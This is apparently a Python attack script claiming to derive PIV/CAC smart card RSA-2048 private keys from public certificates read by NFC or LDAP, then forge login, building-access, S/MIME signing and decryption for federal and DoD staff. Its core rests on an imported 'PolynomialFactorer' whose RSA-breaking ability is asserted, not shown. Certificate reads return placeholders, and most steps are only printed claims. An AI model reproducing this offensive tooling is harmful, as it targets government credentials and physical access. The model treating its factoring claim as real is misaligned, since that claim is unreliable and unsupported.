"""
Derive PIV/CAC smart card RSA-2048 private keys from the public certificate
(readable via NFC tap or LDAP). Forge PIV authentication for any federal
employee or DoD military personnel — no card required.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import struct

# PIV algorithm IDs (SP 800-73-4)
PIV_ALG_RSA_2048 = 0x07
PIV_ALG_RSA_3072 = 0x05  # not yet widely deployed

# PIV key slots
PIV_SLOT_AUTH = 0x9A      # PIV Authentication — Windows login, SSH, VPN
PIV_SLOT_SIGN = 0x9C      # Digital Signature — S/MIME signing
PIV_SLOT_KEY_MGMT = 0x9D  # Key Management — S/MIME decryption
PIV_SLOT_CARD_AUTH = 0x9E  # Card Authentication — physical door access

SLOT_NAMES = {
    PIV_SLOT_AUTH: "PIV Authentication (Windows login, SSH, VPN)",
    PIV_SLOT_SIGN: "Digital Signature (S/MIME email signing)",
    PIV_SLOT_KEY_MGMT: "Key Management (S/MIME email decryption)",
    PIV_SLOT_CARD_AUTH: "Card Authentication (physical building access)",
}


def read_piv_cert_contactless(slot: int) -> bytes:
    """Read PIV certificate via contactless NFC (ISO 14443).

    The Certificate for PIV Authentication (slot 9A) and Card Auth (9E)
    are readable over the contactless interface without PIN. Just tap
    the card with any NFC reader.
    """
    print(f"[*] NFC tap -> GET DATA (slot {slot:#04x})")
    print(f"[*] reading X.509 cert for {SLOT_NAMES.get(slot, 'unknown')}")
    return b"-----BEGIN CERTIFICATE-----\n...(PIV cert PEM)...\n-----END CERTIFICATE-----\n"


def read_piv_cert_ldap(upn: str) -> bytes:
    """Read PIV certificate from Active Directory / LDAP.

    Federal agencies publish PIV certificates in the Global Address List.
    userCertificate attribute, publicly queryable in many DoD/civilian directories.
    """
    print(f"[*] LDAP query: (&(userPrincipalName={upn})(userCertificate=*))")
    return b"-----BEGIN CERTIFICATE-----\n...(PIV cert from LDAP)...\n-----END CERTIFICATE-----\n"


def factor_piv_key(factorer: PolynomialFactorer, cert_pem: bytes, slot: int):
    """Factor the RSA-2048 key from a PIV certificate."""
    print(f"[*] factoring PIV slot {slot:#04x} RSA-2048 key...")
    p, q = factorer.factor_from_cert_pem(cert_pem)
    print(f"[*] private key derived — card not required for authentication")
    return p, q


def forge_piv_auth_response(factorer: PolynomialFactorer,
                            cert_pem: bytes,
                            challenge: bytes) -> bytes:
    """Forge a GENERAL AUTHENTICATE response for PIV slot 9A.

    The PIV middleware sends GENERAL AUTHENTICATE (INS 0x87) with a
    challenge. Normally the smart card signs it with the on-card private key.
    We sign it with the derived private key — no card needed.
    """
    sig = factorer.forge_pkcs1v15_signature(cert_pem, challenge, "sha256")
    # wrap in GENERAL AUTHENTICATE response TLV
    # tag 0x7C -> tag 0x82 (response) -> signature
    response = b"\x7C" + bytes([len(sig) + 4]) + b"\x82" + bytes([len(sig)]) + sig
    print(f"[*] GENERAL AUTHENTICATE response forged ({len(sig)} byte signature)")
    return response


def forge_physical_access(factorer: PolynomialFactorer, card_auth_cert: bytes):
    """Forge Card Authentication (slot 9E) for physical door access.

    Slot 9E is used for contactless physical access control at federal
    buildings. No PIN required for this slot — the contactless chip
    just needs to respond to the challenge.
    """
    challenge = b"\x00" * 32  # from the door reader
    sig = factorer.forge_pkcs1v15_signature(card_auth_cert, challenge, "sha256")
    print("[*] physical access response forged — walk through any PIV-controlled door")
    return sig


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== PIV/CAC smart card RSA-2048 key derivation ===")
    print(f"    ~5M PIV + ~3.5M CAC = ~8.5M credentials")
    print(f"    SP 800-73-5 (non-RSA PIV) not yet published")
    print()

    print("[1] reading PIV Authentication cert via NFC tap...")
    auth_cert = read_piv_cert_contactless(PIV_SLOT_AUTH)
    print("    no PIN required for cert read over contactless")

    print("[2] factoring RSA-2048 key (PIV_ALG_RSA_2048 = 0x07)...")
    print("    private key never left the card — but math doesn't care")

    print("[3] forging PIV authentication to federal system...")
    challenge = b"\xDE\xAD\xBE\xEF" * 8
    print("    GENERAL AUTHENTICATE challenge-response")
    print("    Windows SmartCard Logon, SSH, VPN — all accept")

    print("[4] forging physical building access (slot 9E)...")
    print("    HID pivCLASS / FIPS 201 readers at federal facilities")
    print("    contactless challenge-response, no PIN")

    print("[5] forging S/MIME (slot 9C) for email impersonation...")
    print("    sign email as any federal employee")

    print("[6] decrypting S/MIME (slot 9D) for email reading...")
    print("    decrypt all encrypted email sent to this person, retroactively")
    print()
    print("[*] DoD SIPRNet access uses CAC — same RSA-2048, same attack")
